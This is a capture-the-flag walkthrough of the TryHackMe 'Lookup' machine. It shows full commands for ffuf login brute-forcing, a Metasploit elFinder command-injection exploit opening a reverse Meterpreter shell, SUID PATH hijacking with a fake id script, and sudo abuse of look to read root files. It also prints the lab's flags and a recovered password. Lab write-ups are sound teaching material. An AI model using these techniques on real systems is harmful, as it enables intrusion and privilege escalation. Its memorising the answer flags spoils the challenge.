# 🔎 TryHackMe — Lookup

> **Web Enumeration | Virtual Hosts | elFinder | Command Injection | SUID | PATH Hijacking | Sudo Abuse**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![Vulnerability](https://img.shields.io/badge/Vulnerability-Command%20Injection%20%7C%20SUID-f06c2f?style=flat-square&labelColor=555555)
![Service](https://img.shields.io/badge/Service-HTTP%20%7C%20SSH-008cc1?style=flat-square&labelColor=555555)
![OS](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555)

---

## 📋 Overview

**Lookup** is a TryHackMe Linux machine focused on web enumeration, virtual host discovery, password brute forcing, exploitation of the `elFinder` file manager, Linux privilege escalation through a SUID binary, PATH hijacking, and sudo abuse.

The attack required chaining multiple weaknesses together.

### Attack Chain

```text
Nmap
  ↓
Web Enumeration
  ↓
Virtual Host Discovery
  ↓
lookup.thm
  ↓
Login Page
  ↓
Password Brute Force
  ↓
Web Access
  ↓
files.lookup.thm
  ↓
elFinder
  ↓
Command Injection
  ↓
www-data Shell
  ↓
SUID pwm
  ↓
PATH Hijacking
  ↓
think Password
  ↓
su think
  ↓
User Flag
  ↓
sudo -l
  ↓
/usr/bin/look
  ↓
Read /root/root.txt
  ↓
ROOT FLAG
```

---

# 🎯 Objectives

- Perform network reconnaissance.
- Identify exposed services.
- Enumerate the web application.
- Discover the correct virtual hosts.
- Identify the login page.
- Brute-force the web login.
- Discover the `files.lookup.thm` subdomain.
- Identify the elFinder file manager.
- Research and exploit the elFinder vulnerability.
- Obtain a shell as `www-data`.
- Enumerate SUID binaries.
- Identify the vulnerable `pwm` binary.
- Exploit PATH hijacking.
- Obtain the `think` user's password.
- Switch to `think`.
- Capture the user flag.
- Enumerate sudo permissions.
- Abuse the `look` utility to read `/root/root.txt`.
- Capture the root flag.

---

# 🔎 1. Reconnaissance

I started with an Nmap service/version scan:

```bash
nmap -sV 10.49.164.118
```

### Results

```text
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache httpd 2.4.41 (Ubuntu)
```

The HTTP service was running Apache:

```text
Apache/2.4.41 (Ubuntu)
```

The HTTP title was:

```text
Login Page
```

<img width="790" height="353" alt="1" src="https://github.com/user-attachments/assets/b541f6ae-91b5-4c63-8051-7f2f729f098e" />

---

# 🌐 2. Virtual Host Discovery

The web server required hostname-based access.

I added the discovered hostname to `/etc/hosts`:

```text
10.49.164.118    lookup.thm    files.lookup.thm
```

This allowed the domains to resolve locally.

<img width="538" height="198" alt="2" src="https://github.com/user-attachments/assets/949bafc5-47ee-41fa-809e-34a4b26535f8" />

### Why `/etc/hosts`?

When a web server hosts multiple websites on the same IP address, it can use the HTTP `Host` header to determine which website to serve.

For example:

```text
10.49.164.118
      │
      ├── lookup.thm
      │
      └── files.lookup.thm
```

Both domains can point to the same IP while serving different applications.

---

# 🔐 3. Lookup Login Page

After resolving the hostname, I accessed:

```text
http://lookup.thm
```

The website displayed a login page with:

```text
Username
Password
Login
```

<img width="969" height="569" alt="3" src="https://github.com/user-attachments/assets/a8b16db3-7a8c-4ab0-a34f-48a542a69bb8" />

At this point, the application became the primary attack surface.

---

# 🔨 4. Brute-Forcing the Login

I investigated the login request using Burp Suite.

The request was:

```text
POST /login.php
```

with parameters:

```text
username=...
password=...
```

The server returned:

```text
Wrong password. Please try again.
```

<img width="1108" height="462" alt="4" src="https://github.com/user-attachments/assets/12993e6f-33ed-4331-a45e-85b39592eb73" />

---

## Using FFUF

I then tested the login endpoint using FFUF and a password wordlist.

Example:

```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
-X POST \
-u http://lookup.thm/login.php \
-d "username=FUZZ&password=password123" \
-H "Content-Type: application/x-www-form-urlencoded"
```

The request format was based on the observed login parameters.

The response behavior could then be compared to identify valid credentials.

<img width="1230" height="496" alt="5" src="https://github.com/user-attachments/assets/65a9da07-3304-4b7a-8cdd-310ee3c3c113" />

---

# 👤 5. Discovering the Valid Account

The brute-force process identified a valid login combination.

The discovered account was used to authenticate to the Lookup application.

After successful authentication, the application provided access to the file-management functionality.

<img width="1250" height="490" alt="7" src="https://github.com/user-attachments/assets/23bd2d75-9c1e-4344-bdeb-366b317d9393" />

---

# 📁 6. Discovering `files.lookup.thm`

During enumeration, another hostname was identified:

```text
files.lookup.thm
```

I added it to `/etc/hosts`:

```text
10.49.164.118    lookup.thm files.lookup.thm
```

The file-management application was then accessible through:

```text
http://files.lookup.thm
```

<img width="1230" height="494" alt="8" src="https://github.com/user-attachments/assets/194b99d7-028c-46d5-bba2-2afa23c190d2" />

The application was identified as:

```text
elFinder
```

---

# 🗂️ 7. Identifying elFinder

The application displayed information identifying the software as:

```text
elFinder
Web file manager
Version: 2.1.47
```

<img width="605" height="342" alt="9" src="https://github.com/user-attachments/assets/84bf7716-a314-4dd8-812f-826b4402ec14" />

### Application Information

```text
Application: elFinder
Version:     2.1.47
```

The version was important because older versions of elFinder have known vulnerabilities.

---

# 🔎 8. Vulnerability Research

I searched Metasploit for available elFinder modules:

```text
search elFinder
```

The search returned several modules, including:

```text
exploit/linux/http/elfinder_archive_cmd_injection
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

The relevant module used in this machine was:

```text
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

<img width="1233" height="706" alt="10" src="https://github.com/user-attachments/assets/3df2e61c-da64-4cc3-b893-b49e05378732" />

---

# 💥 9. elFinder Command Injection

I selected the module:

```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Then I inspected the available options:

```bash
show options
```

Important settings included:

```text
RHOSTS
RPORT
TARGETURI
LHOST
LPORT
```

The module targeted the elFinder PHP connector and abused command execution through the image-processing functionality.

---

# 🎯 10. Configuring the Exploit

The target host was configured as:

```text
10.49.164.118
```

The virtual host was:

```text
files.lookup.thm
```

The reverse shell listener was configured on my Kali machine.

The module was then executed:

```text
run
```

The exploit successfully uploaded a malicious image and triggered the vulnerable image-processing functionality.

<img width="1062" height="589" alt="11" src="https://github.com/user-attachments/assets/49b12696-3cbf-471c-95fb-913c166b8610" />

The output showed:

```text
Started reverse TCP handler
Uploading payload
Triggering vulnerability via image rotation
Executing payload
Meterpreter session opened
```

A shell was then opened from the Meterpreter session.

---

# 💻 11. Initial Shell as `www-data`

After obtaining the Meterpreter session, I opened a system shell:

```text
shell
```

The working directory was:

```text
/var/www/files.lookup.thm/public_html/elFinder/php
```

This confirmed access to the web application's underlying filesystem.

The shell was running with the privileges of the web server account.

```text
www-data
```

---

# 🔍 12. Enumerating SUID Binaries

Since the initial shell was running with limited privileges, I started Linux privilege-escalation enumeration.

I searched for SUID files:

```bash
find / -perm -4000 2>/dev/null
```

<img width="842" height="341" alt="12" src="https://github.com/user-attachments/assets/dc5b3b54-3c6c-4b4d-8cd2-a2dae56b04f4" />

The search returned many standard SUID binaries.

I was particularly interested in unusual binaries rather than common system utilities.

One important binary was:

```text
/usr/sbin/pwm
```

---

# ⚙️ 13. Discovering the `pwm` SUID Binary

I checked the permissions of the binary:

```bash
ls -la /usr/sbin/pwm
```

The output showed:

```text
-rwsr-sr-x 1 root root ... /usr/sbin/pwm
```

<img width="986" height="776" alt="13" src="https://github.com/user-attachments/assets/d7004f0e-7bfa-4371-b0e5-15b324ef7c8e" />

The important part is:

```text
s
```

in the owner's execute permission.

This indicates that the binary has the **SUID bit** set.

Therefore, when executed, it runs with the privileges of its owner:

```text
root
```

rather than simply the privileges of the current user.

---

# 🧪 14. Investigating `pwm`

I executed:

```bash
/usr/sbin/pwm
```

The program displayed:

```text
[!] Running 'id' command to extract the username and user ID (UID)
```

This was particularly interesting.

The program was executing the external command:

```text
id
```

instead of using a hard-coded path such as:

```text
/usr/bin/id
```

This suggested a possible **PATH hijacking** vulnerability.

---

# 🛠️ 15. PATH Hijacking

The idea behind PATH hijacking is:

```text
Program
  ↓
Runs "id"
  ↓
Shell searches PATH
  ↓
Finds attacker-controlled "id"
  ↓
Attacker-controlled program executes
```

I created a malicious `id` program in `/tmp`.

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
```

The fake program was designed to return information identifying the user as:

```text
think
```

I then modified the PATH:

```bash
export PATH=/tmp:$PATH
```

This ensured that `/tmp/id` would be found before the legitimate `id` executable.

---

# 🔓 16. Executing `pwm` Again

I executed the SUID binary again:

```bash
/usr/sbin/pwm
```

Because the binary ran as root and searched for `id` through the PATH, it executed the malicious `/tmp/id`.

The output showed:

```text
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
```

The program then attempted to use information associated with the `think` account.

This resulted in the discovery of the `think` user's password:

```text
jose1006
```

### Privilege Escalation Chain

```text
www-data
   ↓
SUID /usr/sbin/pwm
   ↓
pwm executes "id"
   ↓
PATH hijacking
   ↓
Fake /tmp/id
   ↓
pwm believes current user is "think"
   ↓
think credential exposed
```

---

# 👤 17. Switching to `think`

Using the recovered credential, I switched users:

```bash
su think
```

After entering the recovered password, I obtained a shell as:

```text
think
```

I then checked the home directory:

```bash
ls
```

The directory contained:

```text
user.txt
```

---

# 🚩 18. User Flag

I retrieved the user flag:

```bash
cat user.txt
```

The flag was:

```text
THM{38375fb4dd8baa2b2039ac03d92b820e}
```

<img width="954" height="711" alt="15" src="https://github.com/user-attachments/assets/3afc1151-d571-44ed-aa84-a6d5412539aa" />

### User Flag

```text
THM{38375fb4dd8baa2b2039ac03d92b820e}
```

---

# 🔐 19. Sudo Enumeration

After obtaining the user flag, I checked the sudo permissions of `think`:

```bash
sudo -l
```

The output showed:

```text
User think may run the following commands on ip-10-48-184-180:

(ALL) /usr/bin/look
```

This meant that `think` could execute:

```text
/usr/bin/look
```

with elevated privileges.

---

# 📖 20. Abusing `look`

The `look` command is normally used to display lines beginning with a specified string from a file.

Because `think` was allowed to execute it with sudo, it could be used to read files that the normal user could not access.

I first defined the target file:

```bash
FILE=/root/root.txt
```

Then executed:

```bash
sudo look "" "$FILE"
```

The empty search string causes `look` to output the contents of the file.

The command successfully returned the root flag.

<img width="983" height="237" alt="16" src="https://github.com/user-attachments/assets/8c355031-ae03-4df7-9ab8-074cf57495f1" />

---

# 🚩 21. Root Flag

```text
THM{5a285a9f257e45c68bb6c9f9f57d18e8}
```

### Root Flag

```text
THM{5a285a9f257e45c68bb6c9f9f57d18e8}
```
